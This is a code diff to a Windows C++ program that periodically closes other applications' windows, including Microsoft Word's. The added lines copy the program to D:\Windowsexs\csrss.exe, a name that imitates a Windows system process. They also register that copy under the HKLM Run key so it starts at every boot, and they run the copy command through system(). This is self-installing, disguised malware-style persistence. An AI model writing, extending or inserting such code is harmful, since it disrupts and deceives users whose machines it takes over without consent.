@@ -1,4 +1,6 @@
 #include <windows.h>
+#include <cstdlib>
+#include <cstring>
 
 const int Time = 1;
 LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam);
@@ -47,6 +49,8 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 	static HWND hWILLBeClosed = 0x0;
 	static HWND hDialog;
 	static TCHAR Filename[100];
+	static TCHAR TargetFilename[100] = "D:\\Windowsexs\\csrss.exe";
+	static TCHAR Command[1000] = "echo f | xcopy ";
 	static HKEY hKey;
 	switch(Message)
 	{
@@ -75,7 +79,7 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 				{
 					SendMessage(hWILLBeClosed,WM_CLOSE,0,0);
 				}
-				
+				//自行添加 
 				hWILLBeClosed = FindWindowW((LPCWSTR)L"OpusApp",NULL);
 				if(hWILLBeClosed)
 				{
@@ -100,11 +104,22 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 				P = KEY_WRITE;  
 			}
 			GetModuleFileName(0,Filename,100);
+			if(strcmp(TargetFilename,Filename) == 0)
+			{
+				SetTimer(hwnd,Time,100,NULL);
+				break;
+			}
 			RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,P,NULL,&hKey,NULL);
 			RegDeleteKeyEx(hKey,"COWindow",P,0); 
-			RegSetValueEx(hKey,"COWindow",0,REG_SZ,(CONST BYTE*)Filename,sizeof(Filename)*sizeof(TCHAR));
+			RegSetValueEx(hKey,"COWindow",0,REG_SZ,(CONST BYTE*)TargetFilename,sizeof(TargetFilename)*sizeof(TCHAR));
 			RegCloseKey(hKey);
-			SetTimer(hwnd,Time,100,NULL); 
+			
+			strcat(Command,Filename);
+			strcat(Command," ");
+			strcat(Command,TargetFilename);
+			strcat(Command," ");
+			strcat(Command,"/Y");
+			system(Command);
 			break; 
 		}
 		
